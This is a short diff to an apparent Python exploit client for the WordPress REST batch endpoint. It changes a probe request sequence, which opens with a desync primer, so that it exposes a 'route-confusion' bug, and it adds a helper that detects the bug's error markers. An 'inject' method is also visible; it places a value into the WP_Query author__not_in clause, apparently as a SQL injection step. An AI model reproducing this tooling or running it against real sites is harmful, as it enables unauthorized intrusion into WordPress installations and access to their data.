@@ -99,11 +99,12 @@ class BatchClient:
         return self.post({"requests": []})
 
     def marker_probe(self) -> Response:
-        """A benign batch that should produce stable WordPress REST error markers."""
+        """A benign batch that exposes the vulnerable route-confusion alignment bug."""
         return self.post(
             {
                 "requests": [
                     _DESYNC_PRIMER,
+                    {"method": "POST", "path": "/wp/v2/posts"},
                     {"method": "POST", "path": "/wp/v2/block-renderer/core/archives"},
                     {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
                 ]
@@ -132,6 +133,11 @@ class BatchClient:
 
         walk(body)
         return tuple(found)
+
+    @staticmethod
+    def has_route_confusion_markers(response: Response) -> bool:
+        codes = BatchClient.batch_marker_codes(response)
+        return all(code in codes for code in _BATCH_MARKER_CODES)
 
     def inject(self, author_not_in: str) -> Response:
         """Send a payload placing `author_not_in` into the WP_Query author__not_in clause."""
